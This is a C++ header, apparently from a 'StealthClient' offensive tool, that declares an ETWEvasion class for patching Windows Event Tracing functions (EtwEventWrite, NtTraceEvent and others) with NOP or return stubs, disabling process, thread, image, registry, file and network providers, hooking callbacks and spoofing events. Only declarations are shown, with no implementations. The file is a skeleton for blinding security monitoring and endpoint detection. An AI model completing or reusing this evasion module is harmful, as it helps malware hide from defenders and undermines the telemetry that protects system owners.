#pragma once
#include <windows.h>
#include <evntrace.h>
#include <evntprov.h>
#include <winternl.h>

namespace StealthClient {
namespace Evasion {

// ETW function prototypes
typedef ULONG (WINAPI* pEtwEventWrite)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

typedef ULONG (WINAPI* pEtwEventWriteEx)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG64 Filter,
    ULONG Flags,
    LPCGUID ActivityId,
    LPCGUID RelatedActivityId,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

typedef ULONG (WINAPI* pEtwEventWriteString)(
    REGHANDLE RegHandle,
    UCHAR Level,
    ULONGLONG Keyword,
    ULONG StringCount,
    PCWSTR StringArray
);

typedef ULONG (WINAPI* pEtwEventWriteTransfer)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    LPCGUID ActivityId,
    LPCGUID RelatedActivityId,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

typedef NTSTATUS (WINAPI* pNtTraceEvent)(
    HANDLE TraceHandle,
    ULONG Flags,
    ULONG FieldSize,
    PVOID Fields
);

typedef NTSTATUS (WINAPI* pNtTraceControl)(
    ULONG FunctionCode,
    PVOID InBuffer,
    ULONG InBufferLen,
    PVOID OutBuffer,
    ULONG OutBufferLen,
    PULONG ReturnLength
);

class ETWEvasion {
private:
    HMODULE m_ntdll;
    HMODULE m_advapi32;
    
    // Original function addresses
    pEtwEventWrite m_originalEtwEventWrite;
    pEtwEventWriteEx m_originalEtwEventWriteEx;
    pEtwEventWriteString m_originalEtwEventWriteString;
    pEtwEventWriteTransfer m_originalEtwEventWriteTransfer;
    pNtTraceEvent m_originalNtTraceEvent;
    pNtTraceControl m_originalNtTraceControl;
    
    // Patched function addresses
    pEtwEventWrite m_patchedEtwEventWrite;
    pEtwEventWriteEx m_patchedEtwEventWriteEx;
    pEtwEventWriteString m_patchedEtwEventWriteString;
    pEtwEventWriteTransfer m_patchedEtwEventWriteTransfer;
    pNtTraceEvent m_patchedNtTraceEvent;
    pNtTraceControl m_patchedNtTraceControl;
    
    bool m_etwDisabled;
    
    // Helper functions
    bool PatchFunction(FARPROC originalFunc, FARPROC newFunc, size_t patchSize);
    void CreateNopPatch(FARPROC targetFunc, size_t size);
    void CreateReturnPatch(FARPROC targetFunc, ULONG returnValue);
    
public:
    ETWEvasion();
    ~ETWEvasion();
    
    // Main evasion functions
    bool DisableETW();
    bool PatchETWProviders();
    bool RestoreETW();
    
    // Check if ETW is disabled
    bool IsETWDisabled() const { return m_etwDisabled; }
    
    // Disable specific ETW providers
    bool DisableProcessProvider();
    bool DisableThreadProvider();
    bool DisableImageProvider();
    bool DisableRegistryProvider();
    bool DisableFileProvider();
    bool DisableNetworkProvider();
    
    // Advanced ETW evasion
    bool HookETWCallbacks();
    bool UnhookETWCallbacks();
    bool SpoofETWEvents();
    
private:
    // Patched function implementations
    static ULONG WINAPI PatchedEtwEventWrite(
        REGHANDLE RegHandle,
        PCEVENT_DESCRIPTOR EventDescriptor,
        ULONG UserDataCount,
        PEVENT_DATA_DESCRIPTOR UserData
    );
    
    static ULONG WINAPI PatchedEtwEventWriteEx(
        REGHANDLE RegHandle,
        PCEVENT_DESCRIPTOR EventDescriptor,
        ULONG64 Filter,
        ULONG Flags,
        LPCGUID ActivityId,
        LPCGUID RelatedActivityId,
        ULONG UserDataCount,
        PEVENT_DATA_DESCRIPTOR UserData
    );
    
    static ULONG WINAPI PatchedEtwEventWriteString(
        REGHANDLE RegHandle,
        UCHAR Level,
        ULONGLONG Keyword,
        ULONG StringCount,
        PCWSTR StringArray
    );
    
    static ULONG WINAPI PatchedEtwEventWriteTransfer(
        REGHANDLE RegHandle,
        PCEVENT_DESCRIPTOR EventDescriptor,
        LPCGUID ActivityId,
        LPCGUID RelatedActivityId,
        ULONG UserDataCount,
        PEVENT_DATA_DESCRIPTOR UserData
    );
    
    static NTSTATUS WINAPI PatchedNtTraceEvent(
        HANDLE TraceHandle,
        ULONG Flags,
        ULONG FieldSize,
        PVOID Fields
    );
    
    static NTSTATUS WINAPI PatchedNtTraceControl(
        ULONG FunctionCode,
        PVOID InBuffer,
        ULONG InBufferLen,
        PVOID OutBuffer,
        ULONG OutBufferLen,
        PULONG ReturnLength
    );
};

// Global instance
extern ETWEvasion g_ETWEvasion;

// Convenience functions
bool DisableETW();
bool RestoreETW();
bool IsETWDisabled();

} // namespace Evasion
} // namespace StealthClient
